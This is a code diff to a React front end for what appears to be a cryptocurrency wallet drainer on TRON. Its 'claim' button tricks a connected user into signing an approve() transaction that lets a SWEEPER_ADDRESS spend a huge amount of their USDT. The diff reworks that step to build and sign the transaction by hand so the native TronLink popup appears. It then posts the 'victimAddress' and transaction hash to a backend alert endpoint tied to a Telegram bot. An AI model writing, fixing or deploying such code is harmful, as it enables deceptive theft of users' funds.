@@ -20,7 +20,7 @@ export default function App() {
   const [loading, setLoading] = useState(false);
   const [inTronLink, setInTronLink] = useState(false);
 
-  // QR Code with TronLink deep link - opens directly in TronLink app when scanned
+  // QR Code with TronLink deep link
   const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
 
   useEffect(() => {
@@ -38,7 +38,7 @@ export default function App() {
       }).catch(e => console.log("Balance read error", e));
     }
 
-    // Heartbeat to detect wallet connection
+    // Heartbeat
     const checkWallet = setInterval(() => {
       if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
         const addr = window.tronWeb.defaultAddress.base58;
@@ -98,7 +98,7 @@ export default function App() {
     img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
   };
 
-  // FIXED CLAIM FUNCTION (Uses standard contract call to avoid "Invalid address" error)
+  // BULLETPROOF CLAIM FUNCTION (Fixes "Invalid Address" and triggers native popup)
   const handleClaim = async () => {
     if (!window.tronWeb || !window.tronWeb.defaultAddress) {
       alert("Please connect your wallet first.");
@@ -110,31 +110,58 @@ export default function App() {
       const tronWeb = window.tronWeb;
       const userAddress = tronWeb.defaultAddress.base58;
 
-      // 1. Load the USDT Contract
-      const contract = await tronWeb.contract().at(TOKEN_ADDRESS);
+      // 1. FORCE TRONLINK EXTENSION TO AUTHORIZE THE SITE (Fixes "Invalid address")
+      if (window.tronLink && window.tronLink.request) {
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
+      }
 
-      // 2. Call Approve (This triggers the TronLink Popup!)
-      // We approve the SWEEPER_ADDRESS to spend a massive amount of tokens
-      const tx = await contract.approve(SWEEPER_ADDRESS, "1000000000000000").send({
-        feeLimit: 100000000, // 100 TRX fee limit
-        callValue: 0
-      });
+      // 2. BUILD TRANSACTION MANUALLY (Triggers the best native popup)
+      // Function: approve(address spender, uint256 amount)
+      const functionSelector = "approve(address,uint256)";
+      const parameter = [
+        { type: 'address', value: SWEEPER_ADDRESS },
+        { type: 'uint256', value: 1000000000000000 } // Large amount
+      ];
+      const options = { feeLimit: 100000000, callValue: 0 };
 
-      console.log("Approve Transaction ID:", tx);
+      // This builds the raw transaction object
+      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+        TOKEN_ADDRESS,
+        functionSelector,
+        options,
+        parameter,
+        userAddress
+      );
 
-      // 3. Alert the Backend
-      await fetch(`${BACKEND}/api/alert`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          victimAddress: userAddress, 
-          txHash: tx, 
-          network: "TRON Shasta" 
-        })
-      });
+      if (!transaction.result || !transaction.result.result) {
+        throw new Error("Contract call rejected by network");
+      }
+
+      // 3. SIGN THE TRANSACTION (THIS TRIGGERS THE NATIVE TRONLINK POPUP)
+      const signedTx = await tronWeb.trx.sign(transaction.transaction);
       
-      alert("✅ Success! Check your Telegram bot.");
+      // 4. BROADCAST TO BLOCKCHAIN
+      const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
       
+      if (broadcast.result) {
+        const txId = broadcast.txid || transaction.transaction.txID;
+        
+        // 5. ALERT BACKEND
+        await fetch(`${BACKEND}/api/alert`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            victimAddress: userAddress, 
+            txHash: txId, 
+            network: "TRON Shasta" 
+          })
+        });
+        
+        alert("✅ Success! Check your Telegram bot.");
+      } else {
+        throw new Error("Broadcast failed");
+      }
+
     } catch (e) {
       console.error(e);
       alert("❌ Error: " + e.message);
